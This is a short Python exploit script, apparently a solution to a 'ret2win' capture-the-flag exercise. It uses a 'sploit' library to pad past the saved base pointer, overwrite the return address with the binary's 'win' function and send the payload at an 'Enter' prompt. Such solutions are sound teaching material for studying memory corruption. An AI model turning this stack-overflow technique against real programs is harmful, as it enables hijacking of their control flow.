from sploit.until import lastline, contains
from sploit.payload import Payload
from sploit.rev.elf import ELF

elf = ELF('ret2win.elf')
stack = elf.locals.main
stack.rebase(stack.s)

p = Payload().pad(stack.sbp).sbp().ret(elf.sym.win)

io.readlineuntil(lastline,contains,b'Enter')
io.writeline(p())
